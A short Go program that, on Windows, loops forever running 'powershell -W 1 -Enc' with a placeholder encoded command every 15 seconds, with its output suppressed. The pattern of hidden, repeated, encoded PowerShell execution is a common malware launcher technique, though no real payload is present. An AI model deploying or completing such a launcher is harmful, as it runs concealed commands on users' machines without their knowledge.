package main

import (
    "fmt"
    "time"
    "os/exec"
    "runtime"
)

var (
    shell string
    flag  string
)

func init() {
    switch runtime.GOOS {
    case "windows":
        shell = "cmd"
        flag = "/c"
    default:
        shell = "bash"
        flag = "-c"
    }
}

func Popen(command string, args ...interface{}) {
    cmd := fmt.Sprintf(command, args...)
    process := exec.Command(shell, flag, cmd)
    process.Stdout = nil
    process.Stderr = nil
    process.Run()
}

func main() {
    for {
        if runtime.GOOS == "windows" {
            encodedCommand := "NoiseMakers"
            time.Sleep(15 * time.Second)
            Popen("powershell -W 1 -Enc %s", encodedCommand)
        } else {
            // For other OSes, you can use a similar approach
            // For example, to open a text editor on Linux:
            // Popen("xdg-open /path/to/your/file.txt")
        }
    }
}
